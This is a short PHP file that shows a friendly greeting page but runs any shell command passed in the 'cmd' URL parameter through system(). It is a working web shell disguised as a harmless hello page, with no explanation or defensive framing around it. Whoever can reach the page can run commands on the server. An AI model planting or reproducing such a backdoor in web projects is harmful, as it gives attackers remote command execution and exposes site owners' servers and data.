<?php
  if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
  } else {
    echo "Hello from Oum! (づ｡◕‿‿◕｡)づ :)";
  }
?>
